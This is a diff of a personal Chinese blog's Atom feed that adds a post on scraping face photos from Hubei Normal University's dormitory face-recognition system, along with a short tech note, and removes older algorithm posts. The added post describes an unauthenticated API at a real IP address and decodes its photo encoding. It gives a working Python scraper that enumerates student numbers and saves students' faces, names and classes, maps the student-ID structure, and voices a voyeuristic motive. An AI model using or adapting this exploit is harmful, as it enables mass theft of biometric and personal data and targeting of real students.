@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://lililib.github.io/</id>
     <title>煨酒小童</title>
-    <updated>2021-02-28T08:05:11.379Z</updated>
+    <updated>2021-03-12T06:41:29.321Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://lililib.github.io/"/>
     <link rel="self" href="https://lililib.github.io/atom.xml"/>
@@ -10,6 +10,145 @@
     <logo>https://lililib.github.io/images/avatar.png</logo>
     <icon>https://lililib.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, 煨酒小童</rights>
+    <entry>
+        <title type="html"><![CDATA[湖北师范大学人脸爬取]]></title>
+        <id>https://lililib.github.io/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/</id>
+        <link href="https://lililib.github.io/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/">
+        </link>
+        <updated>2021-03-12T05:36:30.000Z</updated>
+        <content type="html"><![CDATA[<p>疫情期间宿舍安装了人脸识别门禁，要求登录一个网站上传人脸照片。对于有价值的信息我有很好的嗅觉（素颜女生嘿嘿(●ˇ∀ˇ●)），感觉可以查探查探.......</p>
+<p>F12刷新审查网络请求，逐个点击查看发现了一个请求有学号构成的接口，这个接口有明显的个人信息imgstr应该就是个人上传的照片了</p>
+<p><img src="https://lililib.github.io//post-images/1615528372126.jpg" alt="" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615528065782.jpg" alt="" loading="lazy"></p>
+<p>复制接口进入地址栏很幸运的发现这个接口并没有登陆限制，再随便改一个学号数字，发现可以请求到其他人的信息，一顿操作猛如虎，目标就是他了</p>
+<figure data-type="image" tabindex="1"><img src="https://lililib.github.io//post-images/1615528440520.png" alt="" loading="lazy"></figure>
+<p>这个一大串imgstr信息搞不明白什么格式，问了隔壁大哥说是base64编码，遂复制信息在线解码为照片，发现解码失败，又自己印证了一些图片经过base64编码后的格式，遂确定这确实为base64编码，只是被加密了。大哥说加密方法都在js文件中，遂进入源代码查看js代码。美化格式，搜索base64关键字，发现了一个极为相关的函数，复制函数名再次搜索，很明显replace这个方法是把imgstr内的'\r\n'代替为''</p>
+<p><img src="https://lililib.github.io//post-images/1615529171600.png" alt="js文件" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615529194707.png" alt="" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615529207895.png" alt="解密代码" loading="lazy"></p>
+<p>再去接口网页那里搜索’\r\n‘,解密方法明显就是去掉’\r\n‘了，复制内容到文本文档替换‘\r\n’为空字符串，再重新复制到在线解码网站，图片被成功还原了！</p>
+<figure data-type="image" tabindex="2"><img src="https://lililib.github.io//post-images/1615529706828.png" alt="加密信息" loading="lazy"></figure>
+<p>解密完成剩下的就是爬取图片了。大致步骤就是请求图片，解密信息，保存信息<br>
+python代码：</p>
+<pre><code>import requests
+import json
+import base64
+
+
+# 返回网页
+def getImgStr(url, headers):
+    try:
+        r = requests.get(url, headers=headers, timeout=30)
+        r.raise_for_status()
+        r.encoding = r.apparent_encoding
+        body = r.text
+        response = json.loads(body)
+        code=response[&quot;code&quot;]
+        userName=response[&quot;data&quot;][&quot;userName&quot;]
+        userNo=response[&quot;data&quot;][&quot;userNo&quot;]
+        instituteName=response[&quot;data&quot;][&quot;instituteName&quot;]
+        majorName=response[&quot;data&quot;][&quot;majorName&quot;]
+        className=response[&quot;data&quot;][&quot;className&quot;]
+        return response[&quot;data&quot;][&quot;imgStr&quot;],code,instituteName,majorName,userName,userNo,className
+    except:
+        print(url+&quot;未有学号&quot;)
+
+headers = {
+    'User-Agent':
+        'Mozilla / 5.0(WindowsNT10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 81.0.4044.138Safari / 537.36',
+}
+url = 'http://218.197.16.168:5027/face/getUserInfo?userNo='
+
+
+#num=2018107010101 美院
+num=2018115010101
+for i in range(0,1):  #班级（倒数第三个数）
+    for j in range(0,30):    #班级人数（倒数两个数）
+        tempurl=url+str(num+i*100+j)    
+        print(tempurl)
+        aaa = getImgStr(tempurl, headers)       #获取的json数据
+        try:
+            imgStr=aaa[0]   #地址
+            code=aaa[1]        #信息码（600 is ok）
+            if(code!=600):
+                continue
+            userName=aaa[4]     
+            userNo=aaa[5]          #学号
+            instituteName=aaa[2]    #院系
+            majorName=aaa[3]    #专业
+            className=aaa[6]    #班级  
+            try:
+                imgStr =imgStr.replace('\\r\\n', '')        #解密
+            except:
+                print('未上传信息')           
+            imgdata=base64.b64decode(imgStr)
+            imgName='{}-{}-{}-{}-{}.jpg'.format(userNo,userName,instituteName,majorName,className)
+            path='D:\download\学校照片\{}'.format(imgName)
+            with open(path, 'wb') as fo:
+                fo.write(imgdata)
+        except:
+            print(&quot; &quot;)
+
+</code></pre>
+<p>爬取结果<br>
+<img src="https://lililib.github.io//post-images/1615530414846.png" alt="" loading="lazy"></p>
+<h2 id="收获">收获</h2>
+<ol>
+<li>学校学号构成记录一下：</li>
+</ol>
+<ul>
+<li>
+<p>2018115010201</p>
+</li>
+<li>
+<p>2018- 年份</p>
+</li>
+<li>
+<p>1- 校区</p>
+</li>
+<li>
+<p>15- 系代码          （最大19）</p>
+</li>
+<li>
+<p>01- 学院代码        （最大07）</p>
+</li>
+<li>
+<p>02- 班级              （  最大14）</p>
+</li>
+<li>
+<p>37- 班级人数          （ 最大66）</p>
+</li>
+</ul>
+<ol start="2">
+<li>pyhon的xlwt库存进excel保存大数据不行比如图片</li>
+</ol>
+<pre><code>import xlwt
+wb=xlwt.Workbook()
+sh1=wb.add_sheet('成绩')    #创建一个页面
+sh1.write(0, 0, 'userNo')   #第零行第零列写入
+sh1.write(0, 1, 'userName')
+wb.save('test.xls')
+</code></pre>
+<ol start="3">
+<li>索然无味，食堂路上遇到的美女也没有那么高不可攀了</li>
+</ol>
+<h3 id="总结">总结</h3>
+<pre><code>啊，原来我的高中同学还是那么漂亮，个版子滴！
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[小问题集合]]></title>
+        <id>https://lililib.github.io/post/xiao-wen-ti-ji-he/</id>
+        <link href="https://lililib.github.io/post/xiao-wen-ti-ji-he/">
+        </link>
+        <updated>2021-03-01T03:38:20.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>手机开数据与开wifi上网哪个费电？</li>
+</ol>
+<p>数据更费电，距信号源越远手机所需连接的功率就越大</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[小米刷机大概步骤]]></title>
         <id>https://lililib.github.io/post/xiao-mi-shua-ji-da-gai-bu-zou/</id>
@@ -802,173 +941,6 @@ public class QuickSort {
 			}
 		}
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[图的着色问题（地图着色问题）]]></title>
-        <id>https://lililib.github.io/post/tu-de-zhao-se-wen-ti-di-tu-zhao-se-wen-ti/</id>
-        <link href="https://lililib.github.io/post/tu-de-zhao-se-wen-ti-di-tu-zhao-se-wen-ti/">
-        </link>
-        <updated>2020-12-18T11:33:33.000Z</updated>
-        <summary type="html"><![CDATA[<h2 id="问题描述">问题描述</h2>
-<p>   给定无向连通图G=(V, E)和m种不同的颜色，用这些颜色为图G的各顶点着色，每个顶点着一种颜色。是否有一种着色法使G中相邻的两个顶点有不同的颜色?<br>
-   这个问题是图的m可着色判定问题。若一个图最少需要m种颜色才能使图中每条边连接的两个顶点着不同颜色，则称这个数m为该图的色数。求一个图的色数m的问题称为图的m可着色优化问题。<br>
-   编程计算：给定图G=(V, E)和m种不同的颜色，找出所有不同的着色法和着色总数。<br>
-简而言之：给一个图，<strong>要求相连接的顶点颜色不能相同</strong>，有m种颜色可以进行着色，可以有多少方案。</p>
-]]></summary>
-        <content type="html"><![CDATA[<h2 id="问题描述">问题描述</h2>
-<p>   给定无向连通图G=(V, E)和m种不同的颜色，用这些颜色为图G的各顶点着色，每个顶点着一种颜色。是否有一种着色法使G中相邻的两个顶点有不同的颜色?<br>
-   这个问题是图的m可着色判定问题。若一个图最少需要m种颜色才能使图中每条边连接的两个顶点着不同颜色，则称这个数m为该图的色数。求一个图的色数m的问题称为图的m可着色优化问题。<br>
-   编程计算：给定图G=(V, E)和m种不同的颜色，找出所有不同的着色法和着色总数。<br>
-简而言之：给一个图，<strong>要求相连接的顶点颜色不能相同</strong>，有m种颜色可以进行着色，可以有多少方案。</p>
-<!-- more -->
-<h2 id="思路">思路</h2>
-<figure data-type="image" tabindex="1"><img src="https://lililib.github.io//post-images/1608291557905.webp" alt="" loading="lazy"></figure>
-<p>  可以想第一个顶点第一种颜色，第二个点再尝试每个颜色是否可以着色，以此类推，有递归的感觉。<br>
-  如同八皇后问题，<strong>放置顶点，循环尝试其中一个颜色（ 颜色方案存入其中名为 x 的数组中），然后检查颜色是否合法（不与任何相连的顶点颜色相同为合法），如果不合法，回溯重试颜色，如果合法，就放置下一个顶点，直到所有顶点放置完毕，则为一成功方案</strong>。</p>
-<h2 id="源码">源码</h2>
-<pre><code>public class mapColoring {
-	static int n = 5; // 有n个结点
-	static int[] x = new int[n + 1]; // answer pace 按顶点1，2，3，4，5，6对应的颜色
-	static int m = 4; // 可用颜色数
-	static int[][] map = new int[n + 1][n + 1];
-	static int sum = 0;
-
-	public static void main(String[] args) {
-		initial(map);
-		backtrack(1);
-		System.out.println(sum);
-	}
-
-	private static void backtrack(int t) {
-		if (t &gt; n) {
-			sum++;
-			for (int i = 1; i &lt;= n; i++) {
-				System.out.print(x[i] + &quot;  &quot;);
-			}
-			System.out.println();
-			return;// ?????
-		} else {
-			for (int i = 1; i &lt;= m; i++) {
-				x[t] = i; // 顶点t被予以第i中颜色
-				if (check(t))// 这里包含了剪枝
-					backtrack(t + 1);
-				x[t] = 0;// 如果颜色不行，回溯回去
-
-			}
-		}
-
-	}
-
-	private static boolean check(int t) {
-		for (int j = 1; j &lt;= n; j++) {
-			if (map[t][j] == 1 &amp;&amp; x[t] == x[j])
-				return false;
-		}
-		return true;
-	}
-
-	/**
-	 * 为1是相连，否之为0
-	 * 
-	 * @param map
-	 */
-	private static void initial(int[][] map) {
-		for (int i = 1; i &lt;= n; i++) {
-			for (int j = 1; j &lt;= n; j++) {
-				map[i][j] = 1;
-				if (i == j)
-					map[i][j] = 0;
-			}
-		}
-		map[1][5] = 0;
-		map[5][1] = 0;
-		map[3][5] = 0;
-		map[5][3] = 0;
-
-	}
-}
-</code></pre>
-<h2 id="运行截图">运行截图</h2>
-<figure data-type="image" tabindex="2"><img src="https://lililib.github.io//post-images/1608292665159.png" alt="" loading="lazy"></figure>
-<!-- more -->
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[最长公共子序列]]></title>
-        <id>https://lililib.github.io/post/zui-chang-gong-gong-zi-xu-lie/</id>
-        <link href="https://lililib.github.io/post/zui-chang-gong-gong-zi-xu-lie/">
-        </link>
-        <updated>2020-12-17T14:23:12.000Z</updated>
-        <summary type="html"><![CDATA[<p>给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。</p>
-<p>一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。<br>
-例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。求解使用费曼算法（Feynman algorithm）</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>给定两个字符串 text1 和 text2，返回这两个字符串的最长公共子序列的长度。</p>
-<p>一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。<br>
-例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。求解使用费曼算法（Feynman algorithm）</p>
-<!-- more -->
-<h2 id="费曼算法">费曼算法</h2>
-<p>步骤：</p>
-<ol>
-<li>将问题写下来</li>
-<li>好好思考</li>
-<li>将答案写下来<br>
-佩服呀，真是万能算法 。。。org</li>
-</ol>
-<h2 id="最长公共子串">最长公共子串</h2>
-<p>先了解一下最长公共子串，例子str1=“abcdefg”  ，str2=“bcdgh” 最长公共子串为bcd。</p>
-<h3 id="填充网格">填充网格</h3>
-<p>求fish 与 hish 的最长子串长度为3</p>
-<p>用网格描述如下：</p>
-<figure data-type="image" tabindex="1"><img src="https://lililib.github.io//post-images/1608129258011.png" alt="" loading="lazy"></figure>
-<h3 id="算法解释">算法解释</h3>
-<figure data-type="image" tabindex="2"><img src="https://lililib.github.io//post-images/1608129297040.png" alt="" loading="lazy"></figure>
-<h3 id="核心代码">核心代码</h3>
-<figure data-type="image" tabindex="3"><img src="https://lililib.github.io//post-images/1608129419821.png" alt="" loading="lazy"></figure>
-<h3 id="注意">注意</h3>
-<p>最长公共子串长度为二维数组中最大的那个值</p>
-<h2 id="最长公共子序列">最长公共子序列</h2>
-<p>fort 与 fosh最长公共子序列长度为2，fish 与 fosh 最长公共子序列长度为 3</p>
-<p>网格描述如下：</p>
-<figure data-type="image" tabindex="4"><img src="https://lililib.github.io//post-images/1608129681573.png" alt="" loading="lazy"></figure>
-<h3 id="算法解释-2">算法解释</h3>
-<figure data-type="image" tabindex="5"><img src="https://lililib.github.io//post-images/1608129705624.png" alt="" loading="lazy"></figure>
-<h3 id="核心代码-2">核心代码</h3>
-<figure data-type="image" tabindex="6"><img src="https://lililib.github.io//post-images/1608129737970.png" alt="" loading="lazy"></figure>
-<h3 id="源码">源码</h3>
-<pre><code>
-public class LCS2 {
-
-	public static void main(String[] args) {
-		String a=&quot;123456&quot;;
-		String b=&quot;2468&quot;;
-		char c[]=new char[a.length()+1];
-		char d[]=new char[b.length()+1];
-		for(int i=1;i&lt;=a.length();i++)
-			c[i]=a.charAt(i-1);
-		for(int i=1;i&lt;=b.length();i++)
-			d[i]=b.charAt(i-1);
-		int map[][]=new int[a.length()+1][b.length()+1];//横竖都空一行
-		for(int i=1;i&lt;=a.length();i++) {
-			for(int j=1;j&lt;=b.length();j++) {
-				if(c[i]==d[j]) {
-					map[i][j]=map[i-1][j-1]+1;
-				}
-				else {
-					map[i][j]=Math.max(map[i-1][j], map[i][j-1]);
-				}
-			}
-		}
-		System.out.println(map[a.length()][b.length()]);
-
-	}
-
-}
-
-</code></pre>
-<h2 id="参考书籍">参考书籍</h2>
-<p><a href="https://book.douban.com/subject/26979890/">《算法图解》</a></p>
 ]]></content>
     </entry>
 </feed>
